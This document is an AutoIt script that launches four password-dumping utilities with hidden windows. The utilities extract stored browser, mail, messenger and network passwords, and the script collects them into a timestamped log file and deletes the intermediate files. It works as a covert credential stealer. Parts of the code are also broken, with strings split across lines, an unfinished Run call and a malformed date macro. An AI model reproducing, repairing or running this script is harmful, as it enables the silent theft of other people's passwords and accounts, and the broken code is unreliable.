Run(@ComSpec & ' /k "..\Password\Software\PSPV.exe /stext
..\Password\New\PSPV.txt"', @ScriptDir, @SW_HIDE)
sleep(200)

Run(@ComSpec & ' /k "..\Password\Software\MSPASS.exe /stext
..\Password\New\MSPASS.txt"', @ScriptDir, @SW_HIDE)
sleep(200)

Run(@ComSpec & ' /k "..\Password\Software\MAILPV.exe /stext
..\Password\New\mailpv.txt"', @ScriptDir, @SW_HIDE)
sleep(200)

Run(@ComSpec & ' /k "..\Password\Software\NETPASS.exe /stext
..\Password\New\NETPASS.txt"', @ScriptDir, @SW_HIDE)
sleep(1000)

Run(@ComSpec & ' /k "COPY ..\Password\New\*.txt ..\Password\New\all.txt" ',
sleep(1000)

Dim $DateTime, $Location, $FileName
$DateTime = @YEAR & "_" & @MON & "_" &MDAY & " " & @HOUR & "_" & @MIN &
"-" & @SEC
$Location = @WorkingDir & '\new\'
$FileName = "all.txt"
FileMove($Location & $FileName , $Location & $DateTime & ".log", 1)
sleep(2000)

Run(@ComSpec & ' /k "del ..\Password\New\*.txt"', @ScriptDir, @SW_HIDE)
sleep(1000)
